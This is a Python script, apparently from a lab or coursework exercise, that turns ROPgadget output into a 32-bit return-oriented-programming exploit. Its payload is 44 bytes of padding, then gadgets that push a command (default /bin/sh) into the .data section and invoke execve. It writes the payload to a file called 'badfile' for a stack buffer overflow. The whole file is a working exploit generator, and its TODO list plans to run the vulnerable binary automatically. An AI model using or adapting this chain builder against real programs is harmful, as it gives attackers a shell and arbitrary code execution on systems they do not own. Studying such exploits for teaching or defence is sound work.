import argparse
import os
from io import StringIO
from pathlib import Path

parser = argparse.ArgumentParser(
    description="",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
)
parser.add_argument("--command", default="/bin/sh")
parser.add_argument("--envp", default="")
parser.add_argument("--out-rop-path", default=Path("examples/Vuln3/Vuln3-32/out-rop.txt"))
#parser.add_argument("--program", default=Path("examples/Vuln3/Vuln3-32/vuln3-32"))


def main(args):

    # region Code Snippet Extraction

    execve_syscall_function = StringIO()
    execve_syscall_function.write("def execve_syscall(argv_ptr, envp_ptr):\n")
    execve_syscall_function.write("    p = b''\n")

    push_bytes_function = StringIO()
    push_bytes_function.write("def push_bytes(data, address):\n")
    push_bytes_function.write("    p = b''\n")

    push_null_function = StringIO()
    push_null_function.write("def push_null(address):\n")
    push_null_function.write("    p = b''\n")

    data_address = 0

    with open(args.out_rop_path, 'r') as file:
        execve_buffer = StringIO()
        null_buffer = StringIO()
        started = False
        finished = False

        for line in file:
            if (not started) and (not finished) and ("p += pack('" in line):
                started = True
            if started and (not finished):
                push_bytes_function.write("    ")
                if "p += b" in line:
                    push_bytes_function.write("p += data\n")
                elif "@ .data" in line:
                    tokens = line.split()
                    data_address = int(tokens[3][:-1], 16)
                    tokens[3] = "address)"
                    new_line = ' '.join(tokens) + '\n'
                    push_bytes_function.write(new_line)
                else:
                    push_bytes_function.write(line)
            if started and (not finished) and ") # mov" in line:
                finished = True

            execve_buffer.write("    ")
            if "# @ .data + " in line:
                tokens = line.split()
                tokens[3] = "address)"
                new_line = ' '.join(tokens) + '\n'
                execve_buffer.write(new_line)
            else:
                execve_buffer.write(line)

            if "mov" in line:
                null_buffer = execve_buffer
                execve_buffer = StringIO()

    push_null_function.write(null_buffer.getvalue())
    push_null_function.write("    return p\n")
    execve_syscall_function.write(execve_buffer.getvalue())
    execve_syscall_function.write("    return p\n")
    push_bytes_function.write("    return p\n")

    push_bytes_function = push_bytes_function.getvalue()
    push_null_function = push_null_function.getvalue()
    execve_syscall_function = execve_syscall_function.getvalue()

    execve_syscall_function = execve_syscall_function.replace("address", "argv_ptr", 1)
    execve_syscall_function = execve_syscall_function.replace("address", "envp_ptr", 1)

    extracted_functions_path = Path("extracted_functions.py")
    with open(extracted_functions_path, 'w') as file:
        file.write("from struct import pack\n\n\n")
        file.write(push_bytes_function)
        file.write("\n\n")
        file.write(push_null_function)
        file.write("\n\n")
        file.write(execve_syscall_function)

    # endregion

    import extracted_functions

    data_stack_pointer = data_address

    rop_chain = b'A'*44

    argv = args.command.split()

    #
    if (len(argv[0]) % 4) is not 0:
        os.symlink(argv[0], Path("Evil"))
        argv[0] = "Evil"
    for arg in argv:
        # Split string into chunks of size 4.
        chunks = [arg[i:i + 4] for i in range(0, len(arg), 4)]
        # If the chunk isn't big enough, pad it with null characters.
        chunks = [chunk.encode('ascii') for chunk in chunks]
        chunks = [chunk.ljust(4, b' ') for chunk in chunks]

        for chunk in chunks:
            rop_chain += extracted_functions.push_bytes(chunk, data_stack_pointer)
            data_stack_pointer += 4

        rop_chain += extracted_functions.push_null(data_stack_pointer)
        data_stack_pointer += 4

    rop_chain += extracted_functions.push_null(data_address + 8)
    rop_chain += extracted_functions.execve_syscall(data_address + 8, data_address + 8)

    exploit_path = Path("badfile")
    with open(exploit_path, 'wb') as file:
        file.write(rop_chain)


if __name__ == "__main__":
    main(parser.parse_args())

"""
TODO:
1. Arguments that are not some multiple of 4 bytes long probably don't work.
    1a. Test whether they work.
    1b. Fix it if they don't.
2. Save the addresses of arguments
3. Push all the addresses to .data (argv)
4. Save the address of argv
5. Pass address of argv to execve_syscall
6. Push envp to .data
7. Pass address of envp to execve_syscall

8. Call ROPGadget instead of relying the user to pass in a file
9. Call the vulnerable executable and pass the exploit in
10. Delete the symlink

"""
